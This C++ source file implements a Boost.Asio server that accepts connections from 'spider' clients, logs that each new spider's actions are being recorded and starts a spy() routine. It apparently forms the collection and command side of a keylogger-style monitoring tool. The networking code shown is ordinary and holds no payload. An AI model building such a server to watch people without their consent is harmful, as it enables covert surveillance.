#include "SpiderNetwork.hpp"
#include "Connection.hpp"

namespace spider
{
SpiderNetwork::SpiderNetwork(const std::string &addr, int port,
                             Sptr<Serialization> serialization,
                             ReceivedQueueSP rec, CommandQueueSP com)
    : acceptor_(std::make_shared<::myboost::asio::Accept>()),
      serialization_(serialization),
      receivedQueue_(rec),
      commandQueue_(com),
      receiveStrand_(*acceptor_->getIoService()),
      commandStrand_(*acceptor_->getIoService())
{
  acceptor_->bind(addr, port);
  acceptor_->listen(20);
  startAccept();
}

void SpiderNetwork::run()
{
  acceptor_->start();
  std::cout << "Server up and running." << std::endl;
}

void SpiderNetwork::stop()
{
  acceptor_->stop();
}

void SpiderNetwork::addSpider(const std::shared_ptr<SpiderClient> &spider)
{
  clients_.insert(spider);
}

void SpiderNetwork::removeSpider(const std::shared_ptr<SpiderClient> &spider)
{
  clients_.erase(spider);
}

Sptr<boost::asio::io_service> SpiderNetwork::getIoService() const
{
  return acceptor_->getIoService();
}

void SpiderNetwork::acceptHandler(const Sptr<::myboost::asio::Connection> newSock)
{
  Sptr<SpiderClient> spider(new SpiderClient(newSock, *this, serialization_,
                                             receivedQueue_, commandQueue_));
  std::cout << "New spider connected, logging its actions !" << std::endl;
  spider->spy();
}

boost::asio::io_service::strand &SpiderNetwork::getReceiveStrand()
{
  return receiveStrand_;
}

boost::asio::io_service::strand &SpiderNetwork::getCommandStrand()
{
  return commandStrand_;
}

void SpiderNetwork::startAccept()
{
  auto acc(std::bind(&SpiderNetwork::acceptHandler, this, std::placeholders::_1));

  acceptor_->async_accept(acc);
}
}